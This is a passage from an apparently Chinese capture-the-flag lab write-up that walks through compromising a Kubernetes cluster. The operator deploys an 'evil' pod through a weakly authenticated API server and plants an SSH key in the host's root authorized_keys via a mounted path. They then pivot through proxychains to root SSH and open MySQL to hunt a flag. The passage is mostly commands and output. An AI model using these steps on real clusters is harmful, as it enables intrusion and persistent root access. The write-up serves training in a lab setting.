ply -f evil-deployment.yamlPlease enter Username: 1Please enter Password: &lt;REDACTED_PASSWORD&gt; unchangedE:\渗透\春秋云镜&gt;kubectl.exe --insecure-skip-tls-verify -s https://&lt;INTERNAL_IP&gt;:6443/ get podsPlease enter Username: 1Please enter Password: &lt;REDACTED_PASSWORD&gt; READY STATUS RESTARTS AGEnginx-deployment-864f8bfd6f-wg9bn 1/1 Running 0 49sE:\渗透\春秋云镜&gt;kubectl.exe --insecure-skip-tls-verify -s https://&lt;INTERNAL_IP&gt;:6443/ exec -it nginx-deployment-864f8bfd6f-wg9bn /bin/bashkubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.Please enter Username: testPlease enter Password: &lt;REDACTED_PASSWORD&gt;root@nginx-deployment-864f8bfd6f-wg9bn:/# echo &quot;ssh-rsa  root@kali-plus&quot; &gt; /mnt/root/.ssh/authorized_keys 使用kali去ssh连接即可，然后连上数据库，flag04在数据库中 ┌──(root㉿kali-plus)-[~/.ssh]└─# proxychains4 ssh -i id_rsa1 root@&lt;INTERNAL_IP&gt;[proxychains] config file found: /etc/proxychains4.conf[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4[proxychains] DLL init: proxychains-ng 4.17[proxychains] Strict chain ... &lt;PUBLIC_IP&gt;:15001 ... &lt;INTERNAL_IP&gt;:22 ... OKWelcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-213-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantageWelcome to Alibaba Cloud Elastic Compute Service !Last login: Mon Mar 17 16:32:24 2025 from &lt;PUBLIC_IP&gt;root@ubuntu-k8s:~# lsmetarget nginx-deployment.yamlroot@ubuntu-k8s:~# mysqlWelcome to the MySQL monitor. Commands end with ; or \g.Your MySQL connection id is 2Server version: 5.7.42-0ubuntu0.18.04.1 (Ubuntu)Copyright (c) 2000, 2023, Oracle and/or its affiliates.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statemen